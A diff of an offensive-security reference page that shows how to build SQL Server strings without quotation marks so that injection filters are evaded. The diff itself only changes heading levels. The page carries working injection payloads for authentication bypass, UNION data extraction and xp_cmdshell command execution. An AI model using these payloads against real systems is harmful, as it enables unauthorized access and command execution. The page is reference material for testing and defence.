@@ -7,11 +7,9 @@ tags: ["bypass", "quotation", "filter evasion"]
 lastUpdated: 2025-03-15
 ---
 
-## Avoiding Quotations
-
 Web applications often implement security filters that block or sanitize quotation marks (`'` or `"`) to prevent SQL injection. These techniques allow you to construct string literals without using quotes in Microsoft SQL Server.
 
-### Using CHAR() Function
+## Using CHAR() Function
 
 The `CHAR()` function returns a character based on its ASCII value, allowing you to build strings character by character:
 
@@ -20,7 +18,7 @@ The `CHAR()` function returns a character based on its ASCII value, allowing you
 SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
 ```
 
-### Using String Concatenation with Variables
+## Using String Concatenation with Variables
 
 Declaring variables to hold characters and concatenating them:
 
@@ -30,7 +28,7 @@ SET @a = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
 -- @a now contains 'admin'
 ```
 
-### Using Hexadecimal Notation
+## Using Hexadecimal Notation
 
 SQL Server allows representing string literals in hexadecimal:
 
@@ -39,7 +37,7 @@ SQL Server allows representing string literals in hexadecimal:
 SELECT 0x61646D696E
 ```
 
-### Using Unicode Notation
+## Using Unicode Notation
 
 For Unicode strings, you can use the N prefix combined with hex:
 
@@ -48,7 +46,7 @@ For Unicode strings, you can use the N prefix combined with hex:
 SELECT NCHAR(97) + NCHAR(100) + NCHAR(109) + NCHAR(105) + NCHAR(110)
 ```
 
-### Using ASCII Values in Computed Columns
+## Using ASCII Values in Computed Columns
 
 When you need to compare strings without quotes:
 
@@ -57,7 +55,7 @@ When you need to compare strings without quotes:
 WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
 ```
 
-### Using Built-in Functions to Generate Strings
+## Using Built-in Functions to Generate Strings
 
 Some built-in functions return predictable strings:
 
@@ -72,7 +70,7 @@ SELECT SCHEMA_NAME(1)
 SELECT USER_NAME(2)
 ```
 
-### Using Subqueries to Get Known Strings
+## Using Subqueries to Get Known Strings
 
 Get literal strings from system tables:
 
@@ -82,9 +80,9 @@ SELECT name FROM sys.databases WHERE database_id = 1
 -- Returns 'master'
 ```
 
-### Practical SQL Injection Examples
+## Practical SQL Injection Examples
 
-#### Authentication Bypass
+### Authentication Bypass
 
 ```sql
 -- Original query with quotes:
@@ -94,7 +92,7 @@ SELECT name FROM sys.databases WHERE database_id = 1
 ' OR username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--
 ```
 
-#### Data Extraction with UNION
+### Data Extraction with UNION
 
 ```sql
 -- Original UNION with quotes:
@@ -104,7 +102,7 @@ SELECT name FROM sys.databases WHERE database_id = 1
 ' UNION SELECT 0x73656E7369746976655F64617461, NULL, NULL--
 ```
 
-#### System Command Execution
+### System Command Execution
 
 ```sql
 -- Original command with quotes:
@@ -114,7 +112,7 @@ SELECT name FROM sys.databases WHERE database_id = 1
 '; EXEC xp_cmdshell CHAR(100)+CHAR(105)+CHAR(114)+CHAR(32)+CHAR(67)+CHAR(58)+CHAR(92)--
 ```
 
-### Combining Techniques
+## Combining Techniques
 
 For complex scenarios, combine multiple techniques:
 
@@ -126,7 +124,7 @@ EXEC @c CHAR(100) + CHAR(105) + CHAR(114)
 -- Executes: EXEC xp_cmdshell 'dir'
 ```
 
-### Using T-SQL String Functions
+## Using T-SQL String Functions
 
 Other T-SQL functions can help construct strings:
 
@@ -140,7 +138,7 @@ SET @s = CHAR(120) + CHAR(120) + CHAR(120)  -- 'xxx'
 SELECT STUFF(@s, 2, 1, CHAR(121))  -- Returns 'xyx'
 ```
 
-### Considerations and Limitations
+## Considerations and Limitations
 
 1. **Performance Impact**: String building with CHAR() can be verbose and may hit query length limits
 2. **Character Encoding**: Be aware of character encoding differences, especially with Unicode
@@ -148,7 +146,7 @@ SELECT STUFF(@s, 2, 1, CHAR(121))  -- Returns 'xyx'
 4. **Column Data Types**: Ensure the generated strings match expected data types
 5. **Query Length Limits**: Very long character concatenations may exceed query limits
 
-### Mitigations
+## Mitigations
 
 To defend against these techniques:
 
